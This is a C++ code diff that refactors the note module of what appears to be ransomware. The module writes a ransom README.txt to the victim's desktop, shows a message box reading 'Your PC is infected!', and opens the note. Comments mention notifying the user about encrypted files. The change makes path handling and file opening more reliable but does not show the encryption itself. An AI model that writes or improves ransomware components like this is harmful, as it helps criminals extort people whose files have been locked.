@@ -239,47 +239,46 @@ NoteModule::NoteModule(std::wstring Note_that_would_be_set_in_file) : Note_that_
 }
 
 // This method notifies user about program.
-// Starts windows to attrach attetnion and creates REAME file with needed explanations.
+// Starts windows to attract attetnion and creates REAME file with needed explanations.
 void NoteModule::NotifyUsersAboutWorkResults() {
-    // Getting username
-    wchar_t UsernameWhoStartedProgram[257];
-    DWORD UsernameWhoStartedProgram_len = 257;
-    GetUserNameW(UsernameWhoStartedProgram, &UsernameWhoStartedProgram_len);
+    // Getting the path to the user's desktop
+    wchar_t desktopPath[MAX_PATH];
+    SHGetFolderPathW(NULL, CSIDL_DESKTOP, NULL, 0, desktopPath);
 
-    // Creating README file at parsed above user's Desktop.
-    path_t README_file_path = L"C:\\Users\\" + std::wstring(UsernameWhoStartedProgram) + L"\\Desktop\\README.txt";
+    // Creating the full path of the README.txt file
+    path_t README_file_path = path_t(desktopPath) / L"README.txt";
     Create_README_file(README_file_path);
-
 
     // Message Box that notifies user about encrypting files and asks to read README
     int msgboxID = MessageBox(
         NULL,
-        "Your PC is infected!\nCheck README.txt file on your desktop.\nPush \"Yes\" button to open file right now.",
+        "Your PC is infected!\nCheck the README.txt file on your desktop.\nPush \"Yes\" button to open the file right now.",
         "CHECK README!",
         MB_ICONEXCLAMATION | MB_YESNO
     );
 
     // If msbox's "Yes" button was pushed - open README.
     if (msgboxID == IDYES) {
-        wchar_t console_string_to_open_README[1024] = L"start ";
-        wcscat(console_string_to_open_README, README_file_path.c_str());
-
-        SetConsoleOutputCP(1251);
-        SetConsoleCP(1251);
-        _wsystem(console_string_to_open_README);
+        ShellExecute(NULL, "open", README_file_path.string().c_str(), NULL, NULL, SW_SHOWNORMAL);
     }
 }
 
 // Method that creates README file at Desktop
-void NoteModule::Create_README_file(path_t const README_path){
-    std::wofstream out;
-    out.open(README_path);
-    if (out.is_open())
-    {
-        out << this->Note_that_would_be_set_in_file << std::endl;
-    }
-    out.close();
+void NoteModule::Create_README_file(const path_t& README_path) {
+    // Checking the file's existence and creating if not 
+    std::filesystem::create_directories(README_path.parent_path());
 
+    // Opening a file for writing
+    std::wofstream out(README_path);
+    if (!out) {
+        std::cerr << "Не удалось открыть файл для записи, по пути:" << README_path << std::endl;
+        return;
+    }
+
+    // Moving variable's content into a file
+    out << Note_that_would_be_set_in_file << std::endl;
+
+    out.close();
 }
 
 // NoteModule implementation ends here
